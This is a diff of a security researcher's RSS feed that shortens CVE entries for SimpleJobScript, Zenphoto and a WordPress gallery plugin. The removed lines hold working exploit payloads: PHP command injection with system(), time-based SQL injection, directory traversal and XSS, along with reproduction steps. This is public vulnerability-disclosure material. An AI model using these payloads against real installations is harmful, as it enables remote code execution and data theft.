@@ -45,19 +45,7 @@ One big difference with pentest is that a bug bounty program is something you bu
       <pubDate>Thu, 13 Feb 2020 00:00:00 +0000</pubDate>
       
       <guid>https://10degres.net/cves/cve-2020-22155/</guid>
-      <description>The installer of SimpleJobScript is vulnerable to Remote Command Execution if not completed yet through the parameter url.
-mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-22155 public announcement: https://github.com/niteosoft/simplejobscript/issues/8 Description:
-The installer of SimpleJobScript is vulnerable to Remote Command Execution if not completed yet through the parameter url
-Details:
-URL: /installer.php
-Parameter: url
-Payload:
-url=example.com&#39;.system(&#39;id&#39;).&#39;&amp;amp;host=127.0.0.1&amp;amp;port=3306&amp;amp;username=test&amp;amp;password=test&amp;amp;db_name=sjs&amp;amp;submit=Save
-Steps to Reproduce:
-1/ Download and extract the SimpleJobScript archive in the server web directory:
-https://simplejobscript.com/downloads/category/products/
-2/ Run the installer
-3/ If the installation process has never been completed before you&amp;rsquo;ll be prompt a form to submit database informations</description>
+      <description>&lt;p&gt;The installer of SimpleJobScript is vulnerable to Remote Command Execution if not completed yet through the parameter &lt;code&gt;url&lt;/code&gt;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -66,17 +54,7 @@ https://simplejobscript.com/downloads/category/products/
       <pubDate>Wed, 12 Feb 2020 00:00:00 +0000</pubDate>
       
       <guid>https://10degres.net/cves/cve-2020-22154/</guid>
-      <description>Zenphoto 1.5.6 was discovered to contain a SQL injection via the postAlbumSort() function in /zp-core/admin-functions.php.
-mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-22154 Description:
-The function postAlbumSort() triggers a SQL query using the POST parameter order, unfortunately his value is not sanitized when building the query.
-Details:
-File: /zp-core/admin-functions.php
-Function: postAlbumSort()
-Parameter: order
-Payload:
-POST /zp-core/admin-edit.php?page=edit&amp;amp;action=savealbumorder XSRFToken=bfc6ec5b3fdffce396ca60b824b68e3eb18a5d4c&amp;amp;checkallaction=noaction&amp;amp;newtag_mass_tags_=&amp;amp;massownerselect=admin&amp;amp;order=id%5B2 and (select sleep(5))%23%5D%3Dnull%26id%5B1%5D%3Dnull&amp;amp;update=Save+Order Recommendation:
-Cast the value to integer.
-PoC:</description>
+      <description>&lt;p&gt;Zenphoto 1.5.6 was discovered to contain a SQL injection via the &lt;code&gt;postAlbumSort()&lt;/code&gt; function in &lt;code&gt;/zp-core/admin-functions.php&lt;/code&gt;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -85,17 +63,7 @@ PoC:</description>
       <pubDate>Tue, 11 Feb 2020 00:00:00 +0000</pubDate>
       
       <guid>https://10degres.net/cves/cve-2020-22145/</guid>
-      <description>A PHP code injection vulnerability in /zp-core/setup/index.php of Zenphoto 1.5.6 allows attackers to execute arbitrary code.
-mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-22145 Description:
-The installation process is prone to PHP code injection which leads to a remote code execution.
-Details:
-File: /zp-core/setup/index.php
-Parameters: db_software, db_user, db_pass, db_host, db_database
-URL: /zp-core/setup/
-Payload:
-POST /zp-core/setup/ db=yes&amp;amp;xsrfToken=490edd5bf985248c832425d350602f5bb1c8043d&amp;amp;db_software=MySQLi%22%3Bsystem%28%24_GET%5B%27c%27%5D%29.%22&amp;amp;db_user=test%22%3Bsystem%28%24_GET%5B%27c%27%5D%29.%22&amp;amp;db_pass=test&amp;amp;db_host=localhost%22%3Bsystem%28%24_GET%5B%27c%27%5D%29.%22&amp;amp;db_database=zenphoto%22%3Bsystem%28%24_GET%5B%27c%27%5D%29.%22&amp;amp;db_prefix=zp_ Recommendation:
-A simple addslashes would do the trick to protect against single and double quotes.
-PoC:</description>
+      <description>&lt;p&gt;A PHP code injection vulnerability in &lt;code&gt;/zp-core/setup/index.php&lt;/code&gt; of Zenphoto 1.5.6 allows attackers to execute arbitrary code.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -104,14 +72,7 @@ PoC:</description>
       <pubDate>Mon, 10 Feb 2020 00:00:00 +0000</pubDate>
       
       <guid>https://10degres.net/cves/cve-2020-22144/</guid>
-      <description>An issue in /zp-core/admin-logs.php of Zenphoto 1.5.6 allows attackers to perform a directory traversal and read arbitrary log files.
-mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-22144 Description:
-The admin function allows to download log files from the local system that are not suppose to.
-Details:
-File: /zp-core/admin-logs.php
-Parameter: filename
-Payload:
-/zp-core/admin-logs.php?action=download_log&amp;amp;page=logs&amp;amp;tab=setup&amp;amp;filename=../../../../../../../../../var/log/alternatives&amp;amp;XSRFToken=bcf89608fdaaa5e293ccd5f83d1614f05bfcbaae PoC:</description>
+      <description>&lt;p&gt;An issue in &lt;code&gt;/zp-core/admin-logs.php&lt;/code&gt; of Zenphoto 1.5.6 allows attackers to perform a directory traversal and read arbitrary log files.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -120,12 +81,7 @@ Payload:
       <pubDate>Sun, 09 Feb 2020 00:00:00 +0000</pubDate>
       
       <guid>https://10degres.net/cves/cve-2020-22143/</guid>
-      <description>A cross site scripting (XSS) vulnerability in /page/search/ of Zenphoto 1.5.6 allows attackers to execute arbitrary web scripts or HTML.
-mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-22143 public announcement: https://github.com/zenphoto/zenphoto/issues/1262 Description:
-The parameters SEARCH_* are not sanitized when displayed in the logout link in the search page when the user is connected.
-Payload:
-/page/search/?SEARCH_xxx=xxx&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;u&amp;gt;&amp;lt;svg/onload=alert(1)&amp;gt;xxx
-PoC:</description>
+      <description>&lt;p&gt;A cross site scripting (XSS) vulnerability in &lt;code&gt;/page/search/&lt;/code&gt; of Zenphoto 1.5.6 allows attackers to execute arbitrary web scripts or HTML.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -134,9 +90,7 @@ PoC:</description>
       <pubDate>Wed, 05 Feb 2020 00:00:00 +0000</pubDate>
       
       <guid>https://10degres.net/cves/cve-2020-8645/</guid>
-      <description>An issue was discovered in Simplejobscript.com SJS through 1.66. There is an unauthenticated SQL injection via the job applications search function. The vulnerable parameter is job_id. The function is getJobApplicationsByJobId(). The file is _lib/class.JobApplication.php.
-mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8645 public announcement: https://github.com/niteosoft/simplejobscript/issues/9 Description:
-An issue was discovered in Simplejobscript.com SJS through 1.66. There is an unauthenticated SQL injection via the job applications search function. The vulnerable parameter is job_id. The function is getJobApplicationsByJobId(). The file is _lib/class.</description>
+      <description>&lt;p&gt;An issue was discovered in Simplejobscript.com SJS through 1.66. There is an unauthenticated SQL injection via the job applications search function. The vulnerable parameter is &lt;code&gt;job_id&lt;/code&gt;. The function is &lt;code&gt;getJobApplicationsByJobId()&lt;/code&gt;. The file is &lt;code&gt;_lib/class.JobApplication.php&lt;/code&gt;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -155,14 +109,7 @@ Unfixed bugs Hackers work on your program, they could choose another one but the
       <pubDate>Wed, 29 Jan 2020 00:00:00 +0000</pubDate>
       
       <guid>https://10degres.net/cves/cve-2020-8440/</guid>
-      <description>controllers/page_apply.php in Simplejobscript.com SJS through 1.66 is prone to unauthenticated Remote Code Execution by uploading a PHP script as a resume.
-mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8440 public announcement: https://github.com/niteosoft/simplejobscript/issues/10 Description:
-controllers/page_apply.php in simplejobscript.com SJS &amp;lt;=1.66 is prone to unauthenticated Remote Code Execution by uploading a PHP script as a resume.
-Details:
-File: /controllers/page_apply.php URL: /apply
-Parameter: cv
-Steps to Reproduce:
-1/ Apply for a job and attach a PHP file as your resume</description>
+      <description>&lt;p&gt;&lt;code&gt;controllers/page_apply.php&lt;/code&gt; in Simplejobscript.com SJS through 1.66 is prone to unauthenticated Remote Code Execution by uploading a PHP script as a resume.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -171,12 +118,7 @@ Steps to Reproduce:
       <pubDate>Sun, 19 Jan 2020 00:00:00 +0000</pubDate>
       
       <guid>https://10degres.net/cves/cve-2020-7229/</guid>
-      <description>An issue was discovered in Simplejobscript.com SJS before 1.65. There is unauthenticated SQL injection via the search engine. The parameter is landing_location. The function is countSearchedJobs(). The file is _lib/class.Job.php.
-mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7229 public announcement: https://github.com/niteosoft/simplejobscript/issues/7 Description:
-An issue was discovered in Simplejobscript.com SJS before 1.65. There is unauthenticated SQL injection via the search engine. The parameter is landing_location. The function is countSearchedJobs(). The file is _lib/class.Job.php.
-Details:
-File: /_lib/class.Job.php
-Function: countSearchedJobs()</description>
+      <description>&lt;p&gt;An issue was discovered in Simplejobscript.com SJS before 1.65. There is unauthenticated SQL injection via the search engine. The parameter is &lt;code&gt;landing_location&lt;/code&gt;. The function is &lt;code&gt;countSearchedJobs()&lt;/code&gt;. The file is &lt;code&gt;_lib/class.Job.php&lt;/code&gt;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -221,7 +163,7 @@ Let&amp;rsquo;s discover how Zomato became one of the best program, not only on 
       <pubDate>Sun, 27 Oct 2019 18:05:10 +0100</pubDate>
       
       <guid>https://10degres.net/services/</guid>
-      <description>With more than 3 years of experience, I had the opportunity to study several aspects of this industry:
+      <description>With more than 6 years of experience, I had the opportunity to study several aspects of this industry:
 As a full time bug hunter, I am pretty familiar with their expectations: What they look for, what are their problems, what make them more involved&amp;hellip;
 As a consultant, I work with platforms to solve the common problems in a relationship with hackers and handle the daily. Support the customers, manage the reports, keep hackers on the right track&amp;hellip;</description>
     </item>
@@ -525,37 +467,7 @@ Since I don&amp;rsquo;t understand Ruby, I wrote my own tool with PHP.&lt;/p&gt;
       <pubDate>Fri, 20 May 2016 00:00:00 +0000</pubDate>
       
       <guid>https://10degres.net/cves/cve-2016-11018/</guid>
-      <description>&lt;p&gt;An issue was discovered in the Huge-IT gallery-images plugin before 1.9.0 for WordPress. The headers &lt;code&gt;Client-Ip&lt;/code&gt; and &lt;code&gt;X-Forwarded-For&lt;/code&gt; are prone to unauthenticated SQL injection. The affected file is &lt;code&gt;gallery-images.php&lt;/code&gt;. The affected function is &lt;code&gt;huge_it_image_gallery_ajax_callback()&lt;/code&gt;.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;mitre: &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-11018&#34;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-11018&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr /&gt;
-&lt;p&gt;While I was working on a famous bug bounty program, WPScan returns me the list of the plugins configured on the Wordpress install.
-Here is what I found in one of them: &lt;a href=&#34;https://wordpress.org/plugins/gallery-images/&#34;&gt;Image Gallery by Huge-IT&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;WPScan output, no issues known:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Name: gallery-images - v1.8.6  
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; |  Location: https://[REDACTED]/wp-content/plugins/gallery-images/  
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; |  Readme: https://[REDACTED]/wp-content/plugins/gallery-images/readme.txt  
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After a fast search on &lt;a href=&#34;https://www.exploit-db.com/&#34;&gt;exploit-db.com&lt;/a&gt; with no success, I finally decided to download it and read the code to find vulnerabilites by myself.
-Since the readme was available, I was able to confirm the version of the plugin.&lt;/p&gt;
-&lt;p&gt;I was looking for two kind of vulnerabilities: file upload and sql injection.
-First thing I did was to locate PHP files, and grepping the result to find &lt;code&gt;Content-Disposition&lt;/code&gt; header:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ find . -name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.php*&amp;#34;&lt;/span&gt; | xargs grep -i header
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:		/*HEIGHT FROM HEADER.PHP*/
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./Front_end/gallery_front_end_view.php:							header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location:&amp;#34;&lt;/span&gt;.$actual_link.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./admin/gallery_func.php:			header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: admin.php?page=gallerys_huge_it_gallery&amp;amp;id=&amp;#39;&lt;/span&gt;.$rowsldccs-&amp;gt;id.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;amp;task=apply&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./admin/gallery_view.php:	header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: admin.php?page=gallerys_huge_it_gallery&amp;amp;id=&amp;#39;&lt;/span&gt;.$row-&amp;gt;id.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;amp;task=apply&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./admin/gallery_view.php:	&amp;lt;div id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gallery-header&amp;#34;&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+      <description>&lt;p&gt;An issue was discovered in the Huge-IT gallery-images plugin before 1.9.0 for WordPress. The headers &lt;code&gt;Client-Ip&lt;/code&gt; and &lt;code&gt;X-Forwarded-For&lt;/code&gt; are prone to unauthenticated SQL injection. The affected file is &lt;code&gt;gallery-images.php&lt;/code&gt;. The affected function is &lt;code&gt;huge_it_image_gallery_ajax_callback()&lt;/code&gt;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -1503,22 +1415,6 @@ Hacktivity 2012 - Joe McCray - Big Bang Theory - Pentesting high security enviro
 Hijacking of abandoned subdomains by Detectify
 Tools dnsexpire by me
 3rdparty-services by me</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://10degres.net/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://10degres.net/</guid>
-      <description>official guide: https://github.com/CVEProject/cveproject.github.io/blob/gh-pages/requester/reservation-guidelines.md
-cve search: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=php OR find project: https://www.sourcecodester.com/php-project
-check excisting CVEs for the product: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Online+Magazine+Management
-find issue confirm CVE doesn&amp;rsquo;t exist: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Online+Magazine+Management
-contact the vendor with all details
-fill form: https://cveform.mitre.org/ -&amp;gt; CVE id
-publish article
-resend url to mitre</description>
     </item>
     
   </channel>
